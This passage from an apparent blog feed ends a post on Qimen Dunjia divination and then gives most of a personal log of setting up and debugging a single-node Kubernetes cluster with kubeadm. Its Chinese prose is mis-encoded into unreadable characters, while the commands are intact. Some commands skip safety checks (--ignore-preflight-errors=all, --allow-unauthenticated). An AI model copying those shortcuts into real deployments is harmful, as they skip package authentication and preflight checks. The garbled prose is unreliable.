¹æ®ï¼šå…«å¦ã€å¤©å¹²ã€åœ°æ”¯ã€å…«é—¨ä¹æ˜Ÿå…«ç¥å„è‡ªæ„è±¡å¯¹åº”çš„å½¢è±¡è±¡å¾è¿›è¡Œåˆ†æã€‚è¿™ä¹Ÿæ˜¯å åœçš„ä¸»è¦å­¦é—®æ‰€åœ¨ã€‚</p><p><strong>èµ·å±€æ˜¯åŸºç¡€ï¼Œè§£å¦æ‰æ˜¯çœŸæ­£çš„ç²¾é«“</strong></p>]]></content>
      
      
      <categories>
          
          <category> Life </category>
          
          <category> å“²å­¦ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> æ˜“å­¦ </tag>
            
            <tag> å¥‡é—¨éç”² </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>k8så•ä¸»æœºé›†ç¾¤éƒ¨ç½²å’Œdebugggggg</title>
      <link href="/2024/03/15/k8s%E5%8D%95%E4%B8%BB%E6%9C%BA%E9%9B%86%E7%BE%A4%E9%83%A8%E7%BD%B2%E5%92%8Cdebugggggg/"/>
      <url>/2024/03/15/k8s%E5%8D%95%E4%B8%BB%E6%9C%BA%E9%9B%86%E7%BE%A4%E9%83%A8%E7%BD%B2%E5%92%8Cdebugggggg/</url>
      
        <content type="html"><![CDATA[<h2 id="æ¦‚å¿µ"><a href="#æ¦‚å¿µ" class="headerlink" title="æ¦‚å¿µ"></a>æ¦‚å¿µ</h2><p>Kubernetes ä¹Ÿç§°ä¸º K8sï¼Œæ˜¯ç”¨äº<strong>è‡ªåŠ¨éƒ¨ç½²ã€æ‰©ç¼©å’Œç®¡ç†å®¹å™¨åŒ–åº”ç”¨ç¨‹åº</strong>çš„å¼€æºç³»ç»Ÿã€‚æœ‰æ•ˆçš„ Kubernetes éƒ¨ç½²ç§°ä¸ºé›†ç¾¤ï¼Œä¹Ÿå°±æ˜¯ä¸€ç»„è¿è¡Œ Linux å®¹å™¨çš„ä¸»æœºã€‚<br>æ¢å¥è¯è¯´ï¼Œæˆ‘ä»¬å¯ä»¥å°†å¤šå°ä¸»æœºç»„åˆæˆé›†ç¾¤æ¥è¿è¡Œ Linux å®¹å™¨ï¼Œè€Œ Kubernetes å¯ä»¥å¸®åŠ©ä½ ç®€å•é«˜æ•ˆåœ°ç®¡ç†é‚£äº›é›†ç¾¤ã€‚æ„æˆè¿™äº›é›†ç¾¤çš„ä¸»æœºè¿˜å¯ä»¥è·¨è¶Šå…¬æœ‰äº‘ã€ç§æœ‰äº‘ä»¥åŠæ··åˆäº‘ã€‚</p><h3 id="Kubernetes-ç‰¹ç‚¹"><a href="#Kubernetes-ç‰¹ç‚¹" class="headerlink" title="Kubernetes ç‰¹ç‚¹"></a>Kubernetes ç‰¹ç‚¹</h3><ul><li><strong>å¯ç§»æ¤</strong>: æ”¯æŒå…¬æœ‰äº‘ï¼Œç§æœ‰äº‘ï¼Œæ··åˆäº‘ï¼Œå¤šé‡äº‘ï¼ˆmulti-cloudï¼‰</li><li><strong>å¯æ‰©å±•</strong>: æ¨¡å—åŒ–, æ’ä»¶åŒ–, å¯æŒ‚è½½, å¯ç»„åˆ</li><li><strong>è‡ªåŠ¨åŒ–</strong>: è‡ªåŠ¨éƒ¨ç½²ï¼Œè‡ªåŠ¨é‡å¯ï¼Œè‡ªåŠ¨å¤åˆ¶ï¼Œè‡ªåŠ¨ä¼¸ç¼©&#x2F;æ‰©å±•</li></ul><p>å‚è€ƒï¼š<a href="https://feisky.gitbooks.io/kubernetes/content/introduction/concepts.html">https://feisky.gitbooks.io/kubernetes/content/introduction/concepts.html</a></p><p>åŸºæœ¬ä¸Šæ¥è®²:</p><ul><li>ä¸€ä¸ªå®¹å™¨ container (å¯èƒ½æ˜¯ Docker )å¯èƒ½æ˜¯ä¸€ä¸ª pod ä¸­çš„ä¼—å¤šå®¹å™¨ä¸­çš„ä¸€ä¸ªï¼›</li><li>åŒä¸€ä¸ª pod æ˜¯ä¸€ç»„ç´§å¯†å…³è”çš„å®¹å™¨é›†åˆï¼Œå…±äº«PIDã€IPCã€NetWor kå’Œ UTS namespaceä»¥åŠæ–‡ä»¶ç³»ç»Ÿï¼Œä¹Ÿæ˜¯ k8s è°ƒåº¦çš„åŸºæœ¬å•ä½ï¼›</li><li>Node åˆ™æ˜¯ Pod åˆ™æ˜¯ Pod çœŸæ­£è¿è¡Œçš„ä¸»æœºï¼Œä¸ºäº†ç®¡ç† podï¼ŒNodeèŠ‚ç‚¹ä¸Šè‡³å°‘è¦è¿è¡Œ container runner(dockeræˆ– rkt)ã€kubeletå’Œkube-proxyæœåŠ¡ï¼›</li><li>è€Œæˆ‘ä»¬æ‰§è¡Œçš„å‘½ä»¤éƒ½æ˜¯åœ¨ master èŠ‚ç‚¹è¿è¡Œçš„(master èŠ‚ç‚¹è´Ÿè½½æ•´ä¸ªé›†ç¾¤çš„ç®¡ç†å’Œå’Œæ§åˆ¶ï¼ŒåŸºæœ¬ ks8 çš„æ‰€æœ‰æ§åˆ¶å‘½ä»¤éƒ½å‘ç»™å®ƒ)ï¼Œmaster ç»„ä»¶å¯ä»¥åœ¨é›†ç¾¤ä¸­ä»»ä½•ä¸€ä¸ªèŠ‚ç‚¹ä¸Šè¿è¡Œã€‚</li></ul><h2 id="åŸºäºDockerçš„æœ¬åœ°å®‰è£…éƒ¨ç½²"><a href="#åŸºäºDockerçš„æœ¬åœ°å®‰è£…éƒ¨ç½²" class="headerlink" title="åŸºäºDockerçš„æœ¬åœ°å®‰è£…éƒ¨ç½²"></a>åŸºäºDockerçš„æœ¬åœ°å®‰è£…éƒ¨ç½²</h2><blockquote><p>åŸºäºDockerçš„æœ¬åœ°æ–¹æ¡ˆæ˜¯ä¼—å¤šèƒ½å¤Ÿå®Œæˆå¿«é€Ÿæ­å»ºçš„æœ¬åœ°é›†ç¾¤æ–¹æ¡ˆä¸­çš„ä¸€ç§ï¼Œä½†æ˜¯å±€é™äºå•å°æœºå™¨ã€‚</p></blockquote><h3 id="Kubernetesæ ¸å¿ƒç»„ä»¶"><a href="#Kubernetesæ ¸å¿ƒç»„ä»¶" class="headerlink" title="Kubernetesæ ¸å¿ƒç»„ä»¶"></a>Kubernetesæ ¸å¿ƒç»„ä»¶</h3><p>Kubernetes ä¸»è¦ç”±ä»¥ä¸‹å‡ ä¸ªæ ¸å¿ƒç»„ä»¶ç»„æˆï¼š</p><ul><li><strong>etcd</strong>ï¼šåˆ†å¸ƒå¼é«˜æ€§èƒ½é”®å€¼æ•°æ®åº“ï¼Œä¿å­˜äº†æ•´ä¸ªé›†ç¾¤æ‰€æœ‰å…ƒæ•°æ®ï¼›</li><li>apiserverï¼šæä¾›äº†èµ„æºæ“ä½œçš„å”¯ä¸€å…¥å£ï¼Œå¹¶æä¾›è®¤è¯ã€æˆæƒã€è®¿é—®æ§åˆ¶ã€APIæ³¨å†Œå’Œå‘ç°ç­‰æœºåˆ¶ï¼›</li><li>controller managerï¼šè´Ÿè´£ç»´æŠ¤é›†ç¾¤çš„çŠ¶æ€ï¼Œæ¯”å¦‚æ•…éšœæ£€æµ‹ã€è‡ªåŠ¨æ‰©å±•ã€æ»šåŠ¨æ›´æ–°ç­‰ï¼›</li><li>schedulerï¼šè´Ÿè´£èµ„æºçš„è°ƒåº¦ï¼ŒæŒ‰ç…§é¢„å®šçš„è°ƒåº¦ç­–ç•¥å°†Podè°ƒåº¦åˆ°ç›¸åº”çš„æœºå™¨ä¸Šï¼›</li><li><strong>kubelet</strong>ï¼šè´Ÿè´£ç»´æŠ¤å®¹å™¨çš„ç”Ÿå‘½å‘¨æœŸï¼ŒåŒæ—¶ä¹Ÿè´Ÿè´£Volumeï¼ˆCVIï¼‰å’Œç½‘ç»œï¼ˆCNIï¼‰çš„ç®¡ç†ï¼›</li><li>Container runtimeï¼šè´Ÿè´£é•œåƒç®¡ç†ä»¥åŠPodå’Œå®¹å™¨çš„çœŸæ­£è¿è¡Œï¼ˆCRIï¼‰ï¼›</li><li><strong>kube-proxy</strong>ï¼šè´Ÿè´£ä¸ºServiceæä¾›clusterå†…éƒ¨çš„æœåŠ¡å‘ç°å’Œè´Ÿè½½å‡è¡¡ï¼›é™¤äº†æ ¸å¿ƒç»„ä»¶ï¼Œè¿˜æœ‰ä¸€äº›æ¨èçš„Add-onsï¼š</li><li>kube-dnsï¼šè´Ÿè´£ä¸ºæ•´ä¸ªé›†ç¾¤æä¾›DNSæœåŠ¡</li><li>Ingress Controllerï¼šä¸ºæœåŠ¡æä¾›å¤–ç½‘å…¥å£</li><li>Heapsterï¼šæä¾›èµ„æºç›‘æ§</li><li>Dashboardï¼šæä¾›GUI</li><li>Federationï¼šé›†ç¾¤è”é‚¦æä¾›è·¨å¯ç”¨åŒºçš„é›†ç¾¤</li><li>Fluentd-elasticsearchï¼šæä¾›é›†ç¾¤æ—¥å¿—é‡‡é›†ã€å­˜å‚¨ä¸æŸ¥è¯¢</li></ul><h3 id="å·¥ä½œæµç¨‹"><a href="#å·¥ä½œæµç¨‹" class="headerlink" title="å·¥ä½œæµç¨‹"></a>å·¥ä½œæµç¨‹</h3><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20240315004026310.png" alt="image-20240315004026310" style="zoom:33%;" /><h3 id="å®‰è£…éƒ¨ç½²"><a href="#å®‰è£…éƒ¨ç½²" class="headerlink" title="å®‰è£…éƒ¨ç½²"></a>å®‰è£…éƒ¨ç½²</h3><p>è®©ç»™æˆ‘ä»¬æ¥çœ‹çœ‹ GPT è€å¸ˆæ€ä¹ˆè¯´çš„ï¼š</p><blockquote><p>æ˜¯çš„ï¼Œä½ å¯ä»¥åœ¨ä½ çš„ 2æ ¸4GB çš„äº‘æœåŠ¡å™¨ä¸Šæ­å»ºä¸€ä¸ªç®€å•çš„ Kubernetes é›†ç¾¤æ¥å­¦ä¹ å…¶åŸºæœ¬æ¶æ„å’ŒåŠŸèƒ½ã€‚ä½†æ˜¯ï¼Œè¦æ³¨æ„åˆ°ç”±äºèµ„æºå—é™ï¼Œä½ å¯èƒ½æ— æ³•æ­å»ºä¸€ä¸ªå®Œæ•´è§„æ¨¡çš„ Kubernetes é›†ç¾¤ï¼Œè€Œåªèƒ½æ¨¡æ‹Ÿä¸€ä¸ªè¾ƒå°è§„æ¨¡çš„é›†ç¾¤ã€‚</p><p>ä»¥ä¸‹æ˜¯ä¸€ç§å¯èƒ½çš„æ–¹æ³•ï¼š</p><ol><li><strong>å®‰è£… Dockerï¼š</strong> Kubernetes ä¾èµ–äºå®¹å™¨æŠ€æœ¯ï¼Œå› æ­¤é¦–å…ˆéœ€è¦åœ¨ä½ çš„æœåŠ¡å™¨ä¸Šå®‰è£… Dockerã€‚</li><li><strong>å®‰è£… kubeadmã€kubectl å’Œ kubeletï¼š</strong> è¿™äº›æ˜¯ Kubernetes çš„ä¸»è¦ç»„ä»¶ï¼Œç”¨äºç®¡ç†é›†ç¾¤ã€ä¸é›†ç¾¤äº¤äº’ä»¥åŠåœ¨èŠ‚ç‚¹ä¸Šè¿è¡Œå®¹å™¨ã€‚</li><li><strong>åˆå§‹åŒ– Kubernetes é›†ç¾¤ï¼š</strong> ä½¿ç”¨ kubeadm åœ¨ä½ çš„æœåŠ¡å™¨ä¸Šåˆå§‹åŒ–ä¸€ä¸ª Kubernetes é›†ç¾¤ã€‚ç”±äºä½ åªæœ‰ä¸€ä¸ªèŠ‚ç‚¹ï¼Œè¿™ä¸ªé›†ç¾¤å°†åªåŒ…å«ä¸€ä¸ªèŠ‚ç‚¹ï¼Œè¿™è¢«ç§°ä¸ºå•èŠ‚ç‚¹é›†ç¾¤ã€‚</li><li><strong>éƒ¨ç½² Nginx Podï¼š</strong> é€šè¿‡ä½¿ç”¨ kubectlï¼Œåœ¨ä½ çš„ Kubernetes å•èŠ‚ç‚¹é›†ç¾¤ä¸Šéƒ¨ç½²ä¸€ä¸ª Nginx Podã€‚ä½ å¯ä»¥ä½¿ç”¨ Deployment æˆ–è€… Pod ç›´æ¥è¿›è¡Œéƒ¨ç½²ã€‚</li></ol><p>è™½ç„¶è¿™æ ·çš„è®¾ç½®ä¸ä¼šåœ¨ç”Ÿäº§ç¯å¢ƒä¸­ä½¿ç”¨ï¼Œä½†å¯¹äºå­¦ä¹ åŸºæœ¬çš„ Kubernetes æ¶æ„å’ŒåŠŸèƒ½æ¥è¯´ï¼Œæ˜¯è¶³å¤Ÿçš„ã€‚è¯·è®°ä½ï¼Œç”±äºèµ„æºé™åˆ¶ï¼Œä½ å¯èƒ½ä¼šé‡åˆ°æ€§èƒ½é—®é¢˜ï¼Œå¹¶ä¸”æ— æ³•å®ç°é«˜å¯ç”¨æ€§å’Œè´Ÿè½½å‡è¡¡ç­‰é«˜çº§åŠŸèƒ½ã€‚</p></blockquote><p>å‚è€ƒå‚è€ƒï¼š</p><p><a href="https://www.hyhblog.cn/2021/02/17/deployment-manual-k8s-for-newbee/#3_k8skubeletkubeadmkubectl">https://www.hyhblog.cn/2021/02/17/deployment-manual-k8s-for-newbee/#3_k8skubeletkubeadmkubectl</a></p><p><a href="https://docker-practice.github.io/zh-cn/kubernetes/setup/kubeadm.html#%E4%BD%BF%E7%94%A8-kubeadm-%E9%83%A8%E7%BD%B2-kubernetescri-%E4%BD%BF%E7%94%A8-containerd">https://docker-practice.github.io/zh-cn/kubernetes/setup/kubeadm.html</a></p><p>å‰ä¸¤éƒ¨åˆ†ç›´æ¥ç•¥è¿‡äº†ï¼Œå¾ˆç®€å•ï¼Œå®‰è£…ç„¶å systemclt restart</p><p>é…ç½®ç½‘æ®µï¼š</p><ul><li>ä¸»æœºèŠ‚ç‚¹ç½‘æ®µï¼š10.0.2.0&#x2F;8</li><li>k8s serviceç½‘æ®µï¼š10.1.0.0&#x2F;16(å®é™…é…ç½®çš„æ—¶å€™æ²¡é…è¿™ä¸ª)</li><li>k8s podç½‘æ®µï¼š10.244.0.0&#x2F;16</li></ul><h4 id="åˆå§‹åŒ–å¹¶å¯åŠ¨é›†ç¾¤-ä½¿ç”¨-kubeadm"><a href="#åˆå§‹åŒ–å¹¶å¯åŠ¨é›†ç¾¤-ä½¿ç”¨-kubeadm" class="headerlink" title="åˆå§‹åŒ–å¹¶å¯åŠ¨é›†ç¾¤(ä½¿ç”¨ kubeadm)"></a>åˆå§‹åŒ–å¹¶å¯åŠ¨é›†ç¾¤(ä½¿ç”¨ kubeadm)</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sudo kubeadm init \</span><br><span class="line">   --image-repository registry.aliyuncs.com/google_containers \</span><br><span class="line">   --kubernetes-version v1.28.2 \</span><br><span class="line">   --service-cidr=10.1.0.0/16 \</span><br><span class="line">   --pod-network-cidr=10.244.0.0/16</span><br></pre></td></tr></table></figure><h5 id="æŠ¥é”™1"><a href="#æŠ¥é”™1" class="headerlink" title="æŠ¥é”™1"></a>æŠ¥é”™1</h5><p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20240315004054404.png" alt="image-20240315004054404"></p><p>è§£å†³ï¼šåŠ ä¸Š <code>--cri-socket=unix:///var/run/cri-dockerd.sock</code></p><p>å…¶ä¸­ kubernetes-versionä¸€ç›´åœ¨è¿­ä»£ï¼Œæ ¹æ®æç¤ºä¸‹è½½æœ€æ–°ç‰ˆå°±å¥½äº†ã€‚</p><h5 id="æŠ¥é”™2"><a href="#æŠ¥é”™2" class="headerlink" title="æŠ¥é”™2"></a>æŠ¥é”™2</h5><p>kubectl å¯åŠ¨å¤±è´¥ï¼Œä¹‹å‰ä¹Ÿä¸€ç›´è¿™ä¸ªé—®é¢˜ã€‚æœäº†ä¸€ä¸‹ï¼Œkubectlå‘½ä»¤éœ€è¦ä½¿ç”¨kubernetes-adminæ¥è¿è¡Œï¼Œéœ€è¦admin.confæ–‡ä»¶ï¼›è€Œadmin.conf æ–‡ä»¶æ˜¯é€šè¿‡ â€œkubeadmin initâ€ å‘½ä»¤åœ¨ &#x2F;etc&#x2F;kubernetes ä¸­åˆ›å»ºçš„ï¼Œä»èŠ‚ç‚¹æ²¡æœ‰è¯¥é…ç½®æ–‡ä»¶ï¼›å› æ­¤éœ€è¦å°†admin.conf<strong>å¤åˆ¶åˆ°ä»èŠ‚ç‚¹</strong></p><p>å¤åˆ¶é…ç½®æ–‡ä»¶å¹¶è§£å†³æ­¤é—®é¢˜ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">sudo <span class="built_in">mkdir</span> ~/.kube</span><br><span class="line">sudo <span class="built_in">cp</span> /etc/kubernetes/admin.conf ~/.kube/</span><br><span class="line"></span><br><span class="line"><span class="built_in">cd</span> ~/.kube</span><br><span class="line">sudo <span class="built_in">mv</span> admin.conf config</span><br><span class="line">sudo service kubelet restart</span><br></pre></td></tr></table></figure><p>æ²¡è§£å†³ï¼Œæˆ‘çœ‹æœ‰äººè¯´æ˜¯é˜¿é‡Œæºçš„é—®é¢˜ï¼Œå†æ”¹ä¸€ä¸‹</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">sudo kubeadm init \</span><br><span class="line">   --image-repository registry.aliyuncs.com/google_containers \</span><br><span class="line">   --kubernetes-version v1.28.2 \</span><br><span class="line">   --pod-network-cidr=10.244.0.0/16 \</span><br><span class="line">   --cri-socket=unix:///var/run/cri-dockerd.sock  \</span><br><span class="line">   --ignore-preflight-errors=all  \</span><br><span class="line">   --v=6</span><br></pre></td></tr></table></figure><p>fuleã€‚æƒ³æ”¾å¼ƒäº†ã€‚</p><p>é‡æ¥ï¼šæŸ¥çœ‹å¯¹åº”ç‰ˆæœ¬</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$ kubeadm config images list                                 </span><br><span class="line">I0314 16:51:47.264528 1389153 version.go:256] remote version is much newer: v1.29.2; falling back to: stable-1.28</span><br><span class="line">registry.k8s.io/kube-apiserver:v1.28.7</span><br><span class="line">registry.k8s.io/kube-controller-manager:v1.28.7</span><br><span class="line">registry.k8s.io/kube-scheduler:v1.28.7</span><br><span class="line">registry.k8s.io/kube-proxy:v1.28.7</span><br><span class="line">registry.k8s.io/pause:3.9</span><br><span class="line">registry.k8s.io/etcd:3.5.9-0</span><br><span class="line">registry.k8s.io/coredns/coredns:v1.10.1</span><br></pre></td></tr></table></figure><p>å†™è„šæœ¬å®‰è£…ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># kube-adm-images.sh</span></span><br><span class="line"><span class="comment"># å¦‚ä¸‹é•œåƒåˆ—è¡¨å’Œç‰ˆæœ¬ï¼Œè¯·è¿è¡Œkubeadm config images listå‘½ä»¤è·å–</span></span><br><span class="line"></span><br><span class="line">images=(</span><br><span class="line">    kube-apiserver:v1.20.2</span><br><span class="line">    kube-controller-manager:v1.20.2</span><br><span class="line">    kube-scheduler:v1.20.2</span><br><span class="line">    kube-proxy:v1.20.2</span><br><span class="line">    pause:3.2</span><br><span class="line">    etcd:3.4.13-0</span><br><span class="line">    coredns:1.7.0</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> imageName <span class="keyword">in</span> <span class="variable">$&#123;images[@]&#125;</span> ; <span class="keyword">do</span></span><br><span class="line">    docker pull registry.cn-hangzhou.aliyuncs.com/google_containers/<span class="variable">$imageName</span></span><br><span class="line">    docker tag registry.cn-hangzhou.aliyuncs.com/google_containers/<span class="variable">$imageName</span> k8s.gcr.io/<span class="variable">$imageName</span></span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure><p>æœç„¶ï¼è¿˜å¾—æ˜¯æ—¥å¿—ï¼ï¼ï¼</p><p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20240315004140706.png" alt="image-20240315004140706"></p><p>å‚è€ƒï¼š<a href="https://blog.csdn.net/Bruce1114/article/details/124636325">https://blog.csdn.net/Bruce1114/article/details/124636325</a></p><p>æ‹‰å– image å¤±è´¥äº†ï¼Œå“ˆå“ˆå“ˆï¼Œæ‰‹åŠ¨æ¢æºæ‹‰å»ç„¶åæ”¹TAGï¼ŒæˆåŠŸï¼ï¼ï¼</p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20240315004214135.png" alt="image-20240315004214135" style="zoom: 33%;" /><h4 id="å¯åŠ¨ä¸€ä¸ª-nginx-æœåŠ¡"><a href="#å¯åŠ¨ä¸€ä¸ª-nginx-æœåŠ¡" class="headerlink" title="å¯åŠ¨ä¸€ä¸ª nginx æœåŠ¡"></a>å¯åŠ¨ä¸€ä¸ª nginx æœåŠ¡</h4><h5 id="æŸ¥çœ‹é›†ç¾¤æœåŠ¡åˆ—è¡¨"><a href="#æŸ¥çœ‹é›†ç¾¤æœåŠ¡åˆ—è¡¨" class="headerlink" title="æŸ¥çœ‹é›†ç¾¤æœåŠ¡åˆ—è¡¨"></a>æŸ¥çœ‹é›†ç¾¤æœåŠ¡åˆ—è¡¨</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ kubectl cluster-info</span><br><span class="line">Kubernetes control plane is running at https://10.0.8.4:6443</span><br><span class="line">CoreDNS is running at https://10.0.8.4:6443/api/v1/namespaces/kube-system/services/kube-dns:dns/proxy</span><br></pre></td></tr></table></figure><h5 id="æŸ¥çœ‹æ§åˆ¶å¹³é¢çš„æœåŠ¡åˆ—è¡¨"><a href="#æŸ¥çœ‹æ§åˆ¶å¹³é¢çš„æœåŠ¡åˆ—è¡¨" class="headerlink" title="æŸ¥çœ‹æ§åˆ¶å¹³é¢çš„æœåŠ¡åˆ—è¡¨"></a>æŸ¥çœ‹æ§åˆ¶å¹³é¢çš„æœåŠ¡åˆ—è¡¨</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$ kubectl get pods -n kube-system</span><br><span class="line">NAME                                    READY   STATUS    RESTARTS   AGE</span><br><span class="line">coredns-66f779496c-t4r9w                0/1     Pending   0          7m35s</span><br><span class="line">coredns-66f779496c-wfplb                0/1     Pending   0          7m35s</span><br><span class="line">etcd-vm-8-4-debian                      1/1     Running   0          7m50s</span><br><span class="line">kube-apiserver-vm-8-4-debian            1/1     Running   0          7m48s</span><br><span class="line">kube-controller-manager-vm-8-4-debian   1/1     Running   0          7m48s</span><br><span class="line">kube-proxy-b67mg                        1/1     Running   0          7m36s</span><br><span class="line">kube-scheduler-vm-8-4-debian            1/1     Running   0          7m48s</span><br></pre></td></tr></table></figure><ul><li><p>nodeæ²¡è·‘èµ·æ¥æ˜¯notreadyï¼Œpodä¹Ÿæ˜¯pendingã€‚ã€‚</p><p>æŸ¥çœ‹ node è¯¦ç»†æƒ…å†µï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$ kubectl describe  node vm-8-4-debian -n kube-system | grep -A 20 <span class="string">&quot;Conditions&quot;</span></span><br><span class="line">Conditions:</span><br><span class="line">  Type             Status  LastHeartbeatTime                 LastTransitionTime                Reason                       Message</span><br><span class="line">  ----             ------  -----------------                 ------------------                ------                       -------</span><br><span class="line">  MemoryPressure   False   Thu, 14 Mar 2024 19:52:24 +0800   Thu, 14 Mar 2024 17:25:16 +0800   KubeletHasSufficientMemory   kubelet has sufficient memory available</span><br><span class="line">  DiskPressure     False   Thu, 14 Mar 2024 19:52:24 +0800   Thu, 14 Mar 2024 17:25:16 +0800   KubeletHasNoDiskPressure     kubelet has no disk pressure</span><br><span class="line">  PIDPressure      False   Thu, 14 Mar 2024 19:52:24 +0800   Thu, 14 Mar 2024 17:25:16 +0800   KubeletHasSufficientPID      kubelet has sufficient PID available</span><br><span class="line">  Ready            False   Thu, 14 Mar 2024 19:52:24 +0800   Thu, 14 Mar 2024 17:25:16 +0800   KubeletNotReady              container runtime network not ready: NetworkReady=<span class="literal">false</span> reason:NetworkPluginNotReady message:docker: network plugin is not ready: cni config uninitialized</span><br></pre></td></tr></table></figure><p>æŠ¥é”™ä¸»è¦ä¸ºï¼šNetworkPluginNotReady message:docker: network plugin is not ready: cni config uninitialized</p><p>çœ‹ç½‘ä¸Šéƒ½è¯´é‡è£…cniï¼š<code>sudo apt-get install --reinstall -y kubernetes-cni</code></p><p>ä½†æ˜¯å¥½åƒæ²¡é…ç½®ä¸Šï¼Œå¯èƒ½ä¹‹å‰è£…å•æœºé›†ç¾¤çš„æ—¶å€™å…³æ‰äº†åˆ™ä¸ªåŠŸèƒ½ï¼Œé…ç½®æ–‡ä»¶é‡Œé¢ä¹Ÿæ²¡æœ‰ç›¸å…³çš„é…ç½®ã€‚ç»§ç»­çœ‹æ•™ç¨‹Â·Â·</p><p><strong>å®‰è£…k8sç½‘ç»œæ’ä»¶Flannelã€‚è£…å¥½ä¹‹åè¿˜æ˜¯NotReady</strong></p><p>æ„ŸåŠ¨ä¸­å›½ï¼ï¼ï¼</p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20240315004302180.png" alt="image-20240315004302180" style="zoom: 33%;" /><p>å‚è€ƒï¼š<a href="https://www.cnblogs.com/hellxz/p/kuberntes_cni_config_uninitialized.html">https://www.cnblogs.com/hellxz/p/kuberntes_cni_config_uninitialized.html</a></p><p>æŠ¥é”™æœ¬è´¨æ˜¯ç½‘ç»œcniæ²¡é…ç½®å¥½ï¼Œä½†æ˜¯ä¹‹å‰å®‰è£…äº†ä¸€ä¸‹å¤±è´¥äº†å°±æ‰¾åˆ«çš„æ–¹æ³•è¶Šè·‘è¶Šè¿œã€‚å®é™…ä¸Šéœ€è¦åœ¨å¯¹åº”ç›®å½•ä¸‹å®‰è£…ã€‚</p><p><code>/opt/cni/bin</code> ç›®å½•ä¸‹ç¼ºå°‘å¾ˆå¤šå¯æ‰§è¡Œæ–‡ä»¶ï¼Œå¤„ç†æ–¹å¼æ˜¯é‡æ–°å®‰è£…kubernetes-cni</p><p><code>sudo apt-get install --reinstall -y --allow-unauthenticated kubernetes-cni</code></p><p>ç„¶åé‡å¯ï¼ŒReadyï¼</p><p>å¥½å§ï¼Œè¿˜è¦å»é™¤masteræ±¡ç‚¹ï¼Œæ¯•ç«Ÿæ­£å¸¸æƒ…å†µä¸‹masterä¸èƒ½æ‰§è¡Œè°ƒåº¦pod</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># root @ VM-8-4-debian in /k8s/nginx-demo [22:25:17] C:1</span></span><br><span class="line">$ kubectl taint nodes --all node-role.kubernetes.io/control-plane-                              </span><br><span class="line">node/vm-8-4-debian untainted</span><br><span class="line"></span><br><span class="line"><span class="comment"># root @ VM-8-4-debian in /k8s/nginx-demo [22:25:31] </span></span><br><span class="line">$ kubectl get no -o yaml | grep taint -A 5                        </span><br><span class="line"></span><br><span class="line"><span class="comment"># root @ VM-8-4-debian in /k8s/nginx-demo [22:26:02] </span></span><br><span class="line">$ kubectl get pods                                                                             </span><br><span class="line">NAME                                READY   STATUS    RESTARTS   AGE</span><br><span class="line">nginx-deployment-7c5ddbdf54-5pp26   1/1     Running   0          9m48s</span><br></pre></td></tr></table></figure><p>æˆæœå±•ç¤º!</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># root @ VM-8-4-debian in /k8s/nginx-demo [22:26:14] </span></span><br><span class="line">$ curl http://10.99.190.11:8000</span><br><span 